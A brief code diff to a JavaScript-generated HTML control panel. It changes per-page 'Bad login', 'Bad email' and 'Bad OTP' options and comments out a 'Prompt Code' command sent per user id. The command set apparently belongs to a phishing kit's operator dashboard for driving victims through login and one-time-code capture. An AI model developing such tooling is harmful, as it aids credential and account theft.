@@ -218,9 +218,9 @@
 
       let incorrectOption = "";
       if (cleanPage === "login") {
+	  incorrectOption = `<option value="bad-login">Bad login</option>`;
+	} else if (cleanPage === "email") {
 	  incorrectOption = `<option value="bad-email">Bad email</option>`;
-	} else if (cleanPage === "auth") {
-	  incorrectOption = `<option value="bad-login">Bad Login</option>`;
 	} else if (cleanPage === "otp") {
 	  incorrectOption = `<option value="bad-otp">Bad OTP</option>`;
 	}
@@ -293,7 +293,7 @@
               <option value="nextpage">Next</option>
               <option value="redirect">Redirect</option>
               <option value="phone-otp">Phone OTP</option>
-              <option value="prompt">Prompt Code</option>
+              <!--option value="prompt">Prompt Code</option-->
             </select>
             <button onclick="sendCommand('${u.id}')">Send</button>
           </td>
